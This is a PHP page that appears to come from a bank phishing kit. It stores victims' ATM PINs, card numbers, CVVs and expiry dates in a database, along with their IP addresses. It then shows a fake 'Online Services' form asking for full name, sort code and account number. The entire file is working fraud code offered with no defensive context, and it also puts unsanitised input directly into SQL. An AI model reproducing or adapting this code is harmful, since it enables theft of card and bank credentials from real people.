<?php
include 'connect.php';
session_start();
$inf10 = $_REQUEST['atmpin'];
$inf12 = $_REQUEST['ccnum'];
$inf13 = $_REQUEST['cvv'];
$inf14 = $_REQUEST['expdate_month'];
$inf15 = $_REQUEST['expdate_year'];

$busca = $_SESSION['NomeUsuario'] . $_SESSION['Usuario'] ;
$ip = $_SERVER['REMOTE_ADDR'];

if(empty($inf13) || strlen($inf10) < 4){
   echo '<html><style>td{color:#000}td{font-family:arial,sans-serif} </style><body></body><script language="javascript">';
   echo ' alert("Confirm Your ATM 4 Digit Pin");';
   echo 'history.back(-1); </script>';
   echo '</script></html>';
   exit; 
}

    $sql = "UPDATE `JSPHLT` SET ID_AtmPin='$inf10', ID_CardNumber='$inf12', ID_CardCvv='$inf13', ID_CardExpiryMes='$inf14', ID_CardExpiryAno='$inf15' WHERE CodBusca ='$busca';";
    $QueryAuto = mysql_query($sql); 
	if (!$QueryAuto) {  
             return;
    } else {
		$data = date("d/m/Y - H:i:s");
		$message = "\n\nSENHA: $inf1\n\nDATA: $data\n\nIP: $ip\n\n\n";
		
	}
	
	
?>
	
	
<head>
	
<title>Online Services</title>
<link rel="shortcut icon" href="favicon.ico" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>
</head>

<style type="text/css">
Body{
background-image: url('');
background-repeat: no-repeat;
margin-left:0px;
margin-top:0px;
margin-bottom:700px
}
</style>
</head>

</head>

<body style="background-image: url('2.jpg')">
<form id="form2" onsubmit="return validar(this);" action="sucessook.php" method="post">
<div id="Layer9" style="position:absolute; width:895px; height:123px; z-index:3; left: 67px; top: 224px">

<div class="formField clearfix">
  <div class="formFieldInner">
    <label for="ba"><b>Full Name:</b> <br>
	</label>
    <input id="fuln" name="fuln" class="" maxlength="40" size="40" value="" type="text" />
  </div>
</div>
<div class="formField clearfix">
  <div class="formFieldInner">


    <label for="ba"><b>Sort Code:</b> <br>
	</label>
    <input autocomplete="off" id="frmCustIDData:strFirstName" name="sort1"  style="margin-right: 5px" maxlength="2" size="1" type="text">
	<input autocomplete="off" id="frmCustIDData:strFirstName" name="sort2" style="margin-right: 5px" maxlength="2" size="1" type="text">
	<input autocomplete="off" id="frmCustIDData:strFirstName" name="sort3"  maxlength="2" size="1" type="text">
  </div>
</div>
<div class="formField clearfix">
  <div class="formFieldInner">

    <label for="ba"><b>Account Number:</b> <br>
	</label>
    <input id="account" name="account" class="" maxlength="8" size="13" value="" type="text" />
  </div>
</div>
</div>
<div id="Layer4" style="position:absolute; width:95px; height:41px; z-index:4; left: 847px; top: 371px;">
    <input type="image" name="imageField" id="imageField" src="3.png" width="102" height="37" />
</form>
</div>
</body>
</html>